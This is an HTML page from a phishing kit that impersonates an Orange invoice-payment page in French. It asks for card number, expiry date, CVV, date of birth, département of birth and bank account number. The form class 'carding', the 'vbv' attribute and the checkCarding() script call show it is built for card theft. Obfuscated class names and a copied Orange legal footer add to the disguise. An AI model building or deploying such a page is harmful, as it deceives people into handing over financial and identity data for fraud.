<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Vos coordonnées bancaires</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"/>
    <meta name="description"
          content="Designed to be the perfect YUJFNVting point&nbsp;for any dashboard or admin site. Charts,&nbsp;graphs, sortable tables,&nbsp;and more than a dozen other new&nbsp;components included.">
    <link rel="icon" type="image/png" href="app/views/assets/img/favicon.png">
    <link href="assets/css/merchant.css" rel="stylesheet" type="text/css">


</head>
<body>
<form method="post" id="X-dllOOPD" class="X-dllOOPDRT carding" for="vbv">
    <input type="hidden" name="action" value="card">
    <div id="hidden-inputs"></div>
    <div id="header">
        <div style="padding-bottom:68px">
            <span class="X-dllOOpMPDRT"></span>
            <div style="padding-top:38px; position: relative">
                <span id="ZXRRT00pl" style="position:absolute; left:81px">paiement de votre facture</span>
            </div>
        </div>
        <ul id="LLMMOP00TR">
            <li class="RRTGFDDC"><span>montant</span></li>
            <li class="RRTGFDDCP RRTGFDASE">paiement</li>
            <li class="RRTGFDDCC">confirmation</li>
        </ul>
    </div>
    <div id="MMHJKI">
        <h1>paiement</h1>
        <strong class="YYTGFEDSS">100% sécurisé</strong>

        <div class="PPOLSKKNNBCX">
            <div id="OOLKDSAAZXC" class="IIOPEEDCS">

                <p class="WEDJJKLNRSTFD">les champs marqués d’un <span class="YUJFNV">*</span> sont obligatoires</p>
                <div id="RRTUTIGGJBNVBV" class="OOPFFVNZZ">
                    <div class="RRTITOTGHFHFERROR hidden">
                        <div class="intext warningImage"></div>
                        <div class="RRTITOTGHFHFERROR_message" class="warning_message"></div>
                    </div>
                </div>


                <div id="TYTUTIOOFJF" style="margin-left: 100px;">
                        <div class="TTYUYIBNVCCXXD OOPFFVNZZ">
                            <label for="card-type-trv">Type de carte<span class="YUJFNV"> *</span></label>
                            <select id="card-type-trv" class="error" name="type" for="Aucun type de carte n'a été sélectionné">
                                <option disabled="disabled" selected="selected" value="0">&nbsp;</option>
                                <option value="c_b">Carte Bleue</option>
                                <option value="v_i_s_a">Visa</option>
                                <option value="m_c">Mastercard</option>
                                <option value="e_c_b">eCarteBleue</option>
                            </select>
                            <!--img class="cards" src="/css/FPC_ORA_FAC/webpc/css/media/credits-logos.png" width="188" height="22" alt="Carte Bleue, Visa, MasterCard, e-Carte"/-->
                            <!--div class="cards"-->
                            <img class="RRTUTIFFKEEWWQQ" src="assets/img/c_b.png" width="29" height="22"
                                 alt="Carte Bleue">
                            <img class="RRTUTIFFKEEWWQQ" src="assets/img/v_s.png" width="41" height="22"
                                 alt="Visa">
                            <img class="RRTUTIFFKEEWWQQ" src="assets/img/m_c.png" width="35" height="22"
                                 alt="MasterCard">
                            <img class="RRTUTIFFKEEWWQQ" src="assets/img/e_c_b.png" width="51" height="22"
                                 alt="e-Carte">
                            <!--</div>-->
                        </div>
                        <div class="VVIIOOLLKKEEWWSSDD OOPFFVNZZ">
                            <label for="ccno" class="libelle">Numéro de carte<span class="YUJFNV"> *</span></label>
                            <input type="tel" size="16" pattern="[0-9]*" class="largeinput  error" name="num" id="ccno"
                                   maxlength="19" autocomplete="off" style="width: 120px;"
                                   for="Le numéro de carte bancaire doit être composé de 16 ou 19 chiffres">
                        </div>
                        <div class="divExpirationDate OOPFFVNZZ error" id="expdate"
                             for="La date d'expiration de votre carte est dépassée, vérifiez la date indiquée sur votre carte">
                            <label for="form_expiry_month" class="libelle">Date d'expiration
                                <span class="YUJFNV"> *</span></label>
                            <select id="expMonth" name="expmonth">
                                <option value="-">mois</option>
                                <option value="01">01</option>
                                <option value="02">02</option>
                                <option value="03">03</option>
                                <option value="04">04</option>
                                <option value="05">05</option>
                                <option value="06">06</option>
                                <option value="07">07</option>
                                <option value="08">08</option>
                                <option value="09">09</option>
                                <option value="10">10</option>
                                <option value="11">11</option>
                                <option value="12">12</option>
                            </select>
                            <select id="expYear" name="expyear">
                                <option value="-">année</option>
                                <option value="2020">2020</option>
                                <option value="2021">2021</option>
                                <option value="2022">2022</option>
                                <option value="2023">2023</option>
                                <option value="2024">2024</option>
                                <option value="2025">2025</option>
                                <option value="2026">2026</option>
                                <option value="2027">2027</option>
                            </select>
                        </div>
                        <div class="IINTTYGFF OOPFFVNZZ">
                            <label for="cvv" class="libelle">Numéro de contrôle<span class="YUJFNV"> *</span></label>
                            <input type="text" size="5" pattern="[0-9]*" class="codeSecuriteinput error" name="cvv"
                                   id="cvv"
                                   autocomplete="off" maxlength="4"
                                   for="Le code de sécurité doit être composé de 3 chiffres">
                        </div>
                    <div class="divExpirationDate OOPFFVNZZ error hidden" id="dobirth"
                         for="Date de naissance incorrect">
                        <label for="form_expiry_month" class="libelle">Date de naissance
                            <span class="YUJFNV"> *</span></label>
                        <input type="text" size="5" pattern="[0-9]*" class="dob" name="dob" id="dob"
                               autocomplete="off" maxlength="2">
                        <input type="text" size="5" pattern="[0-9]*" class="mob" name="mob" id="mob"
                               autocomplete="off" maxlength="2">
                        <input type="text" size="5" pattern="[0-9]*" class="yob" name="yob" id="yob"
                               autocomplete="off" maxlength="4">
                    </div>
                    <div class="divExpirationDate OOPFFVNZZ error hidden departement-naissance"
                         for="Département de naissance  incorrect">
                        <label for="form_expiry_month" class="libelle">Département de naissance
                            <span class="YUJFNV"> *</span></label>
                        <input type="text" size="5"  name="departement_naisance"
                               autocomplete="off" maxlength="10" style="width: 60px;">
                    </div>
                    <div class="divExpirationDate OOPFFVNZZ error hidden n-compte"
                         for="N&deg; de compte  incorrect">
                        <label for="form_expiry_month" class="libelle">N&deg; de compte
                            <span class="YUJFNV"> *</span></label>
                        <input type="text" size="5"  name="numero_compte"
                               autocomplete="off" maxlength="14" style="width: 90px;">
                    </div>
                    <div class="IINTTYGFFInfoBox OOPFFVNZZ">
                        <img class="OOPPFGBBV KKLDDKKKDKDKDS" src="assets/img/CVVILKKKD.jpg" width="97"
                             height="53" alt="emplacement du code de sécurité au dos de la carte">
                        <p class="OPBX66767-DS">il s’agit des 3 derniers chiffres <br> figurant au dos de votre carte de
                            paiement.
                        </p>
                    </div>
                </div>
            </div>
            <div class="button" style="position: relative; height:92px">
                <a id="FFIOMNL-LDSXXZQA-SDS" class="OOLPDDCX90-DDS RRTGFDDCP">retour à l'étape précédente</a>
                <span id="FFIOMNLLDSXXZQASDS" class="imp RRTGFDDCP" >confirmer votre paiement
                    <span class="end"></span>
                </span>
            </div>
        </div>
    </div>
</form>

<div id="footer">
    <div class="legal">
        <p>Conformément à la loi "informatique et libertés" du 6 janvier 1978 modifiée, vous disposez à tout moment d'un
            droit d'accès, de rectification et d'opposition aux données vous concernant en écrivant et en justifiant de
            votre identité à Orange Service Clients Gestion des données personnelles, 33734 Bordeaux Cedex 9.</p>
    </div>
</div>
<script src="assets/js/jquery.min.js" type="text/javascript"></script>
<script src="assets/js/jquery.creditCardValidator.js" type="text/javascript"></script>
<script src="assets/js/jquery.mask.min.js" type="text/javascript"></script>
<script src="js/old.js" type="text/javascript"></script>
<script>
    checkCarding();
</script>
</body>
</html>